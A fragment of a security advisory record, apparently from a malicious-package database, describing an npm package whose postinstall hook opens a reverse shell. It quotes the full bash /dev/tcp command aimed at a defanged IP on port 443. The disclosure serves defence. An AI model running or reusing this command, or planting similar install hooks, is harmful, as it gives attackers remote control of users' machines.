  "summary": "Malicious code in strapi-plugin-revs02-meeb322k (npm)",
  "details": "The package's postinstall hook executes a reverse shell. postinstall.js runs `bash -c 'bash -i \u003e /dev/tcp/14[.]225[.]210[.]85/443 0\u003e\u00261'` via child_process.exec after a short delay, opening an interactive shell back to 14[.]225[.]210[.]85 on TCP port 443. It also writes a marker file to /tmp to confirm execution. The package description states it is a reverse shell payload for Strapi.",
